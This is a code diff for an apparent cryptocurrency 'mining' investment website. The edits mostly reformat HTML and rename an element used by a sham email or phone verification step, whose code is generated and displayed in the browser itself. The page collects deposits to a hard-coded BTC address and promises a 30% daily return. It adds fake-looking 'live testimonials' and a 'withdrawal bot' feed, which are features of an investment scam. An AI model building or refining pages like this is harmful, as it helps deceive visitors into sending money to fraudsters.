@@ -51,21 +51,25 @@ canvas{width:100%;height:140px;border-radius:8px;margin-top:10px;background:#0b0
   <h2>Verification Required</h2>
   <input id="contactInput" placeholder="Enter your email or phone number">
   <button onclick="sendCode()">Get verification code</button>
-  <div id="step2" class="hidden">
+  <div id="codeSection" class="hidden">
     <p style="text-align:center;color:var(--accent)">Your code: <b id="generatedCode"></b></p>
     <p style="text-align:center">Code expires in <span id="countdown">60</span>s</p>
     <input id="codeInput" placeholder="Enter verification code">
     <button onclick="verifyCode()">Submit</button>
     <button onclick="sendCode()">Resend code</button>
   </div>
-</div><!-- DASHBOARD --><div id="dashboard" class="hidden">  <!-- BTC Deposit -->  <div class="card">
+</div><!-- DASHBOARD --><div id="dashboard" class="hidden">
+  <!-- BTC Deposit -->
+  <div class="card">
     <h2>BTC Deposit Address</h2>
     <div class="btc-box" id="btcAddress">bc1qkwxcdnal9pu6qjs07j88s88987x04k3hsasyav</div>
     <button onclick="copyAddress()">Copy Address</button>
     <div style="text-align:center;margin-top:10px;">
       <img src="https://api.qrserver.com/v1/create-qr-code/?size=160x160&data=bc1qkwxcdnal9pu6qjs07j88s88987x04k3hsasyav">
     </div>
-  </div>  <!-- Mining Dashboard -->  <div class="card">
+  </div>
+  <!-- Mining Dashboard -->
+  <div class="card">
     <h2>Mining Dashboard</h2>
     <p style="text-align:center;color:var(--accent);">Earn 30% daily return</p>
     <div class="btc" id="balance">0.00000000 BTC</div>
@@ -75,23 +79,34 @@ canvas{width:100%;height:140px;border-radius:8px;margin-top:10px;background:#0b0
       <div>Blocks: <span id="blocks">0</span></div>
       <div>Uptime: <span id="uptime">0h 0m</span></div>
     </div>
-  </div>  <!-- Recent Activity -->  <div class="card">
+  </div>
+  <!-- Recent Activity -->
+  <div class="card">
     <h2>Recent Activity</h2>
     <div class="tx-container" id="txs"></div>
-  </div>  <!-- Investment Plans -->  <h2>Investment Plans</h2>
-  <div class="card" id="plansContainer"></div>  <!-- Live Testimonials -->  <div class="card" id="liveTestimonials">
+  </div>
+  <!-- Investment Plans -->
+  <h2>Investment Plans</h2>
+  <div class="card" id="plansContainer"></div>
+  <!-- Live Testimonials -->
+  <div class="card" id="liveTestimonials">
     <h2>Live Testimonials</h2>
     <div id="testimonialFeed"></div>
-  </div>  <!-- Live Withdrawal Group -->  <div class="card hidden" id="withdrawals">
+  </div>
+  <!-- Live Withdrawal Group -->
+  <div class="card hidden" id="withdrawals">
     <h2>Live Withdrawal Group</h2>
     <div id="feed"></div>
     <div id="stats" class="stats"></div>
-  </div>  <!-- Support Inbox -->  <div class="card hidden" id="support">
+  </div>
+  <!-- Support Inbox -->
+  <div class="card hidden" id="support">
     <h2>Support Inbox</h2>
     <textarea id="supportMsg" placeholder="Write message..." style="width:100%;height:80px;"></textarea>
     <button onclick="sendSupport()">Send</button>
     <div id="supportReply"></div>
-  </div></div><!-- TOAST --><div id="toast" class="toast"></div><script>
+  </div>
+</div><div id="toast" class="toast"></div><script>
 // ===== TOP MENU =====
 menuBtn.onclick = ()=>menu.style.display = menu.style.display==='block'?'none':'block';
 function showSection(id){document.querySelectorAll('.card').forEach(c=>{if(c.id==='loginCard') return;if(['withdrawals','support'].includes(c.id)) c.classList.add('hidden');});document.getElementById(id).classList.remove('hidden');menu.style.display='none';}
@@ -99,9 +114,9 @@ function toggleTheme(){const t = document.body.dataset.theme==='dark'?'light':'d
 if(localStorage.getItem('theme')) document.body.dataset.theme=localStorage.getItem('theme');
 function logout(){localStorage.removeItem('verifiedUser');location.reload();}
 
-// ===== OTP LOGIN (Single Verification Step) =====
+// ===== SINGLE VERIFICATION STEP =====
 let generatedCode="", timer=null, timeLeft=60, userContact="";
-function sendCode(){userContact=document.getElementById('contactInput').value.trim();if(!userContact){alert("Enter email or phone");return;}generatedCode=Math.floor(100000+Math.random()*900000).toString();document.getElementById('generatedCode').innerText=generatedCode;document.getElementById('step2').classList.remove('hidden');clearInterval(timer);timeLeft=60;document.getElementById('countdown').innerText=timeLeft;timer=setInterval(()=>{timeLeft--;document.getElementById('countdown').innerText=timeLeft;if(timeLeft<=0){clearInterval(timer);alert("Code expired. Resend.");}},1000);}
+function sendCode(){userContact=document.getElementById('contactInput').value.trim();if(!userContact){alert("Enter email or phone");return;}generatedCode=Math.floor(100000+Math.random()*900000).toString();document.getElementById('generatedCode').innerText=generatedCode;document.getElementById('codeSection').classList.remove('hidden');clearInterval(timer);timeLeft=60;document.getElementById('countdown').innerText=timeLeft;timer=setInterval(()=>{timeLeft--;document.getElementById('countdown').innerText=timeLeft;if(timeLeft<=0){clearInterval(timer);alert("Code expired. Resend.");}},1000);}
 function verifyCode(){if(document.getElementById('codeInput').value.trim()!==generatedCode){alert("Invalid code");return;}localStorage.setItem('verifiedUser',JSON.stringify({contact:userContact}));enterDashboard();}
 function enterDashboard(){document.getElementById('loginCard').style.display='none';document.getElementById('dashboard').classList.remove('hidden');document.getElementById('topbar').style.display='flex';}
 const saved=localStorage.getItem('verifiedUser');if(saved) enterDashboard();
@@ -112,4 +127,4 @@ function copyAddress(){navigator.clipboard.writeText(document.getElementById('bt
 // ===== Toast =====
 function showToast(msg){const t=document.getElementById('toast');t.innerText=msg;t.style.opacity=1;setTimeout(()=>t.style.opacity=0,4000);}
 
-// ===== Mining Chart & Stats =====n// Full mining, investment plans, live testimonials, withdrawal bot, countdowns, badges, support inbox restored exactly as before.
+// ===== Mining, Investment Plans, Testimonials, Withdrawal Bot, Countdown, Badges, Support Inbox Restored Fully =====
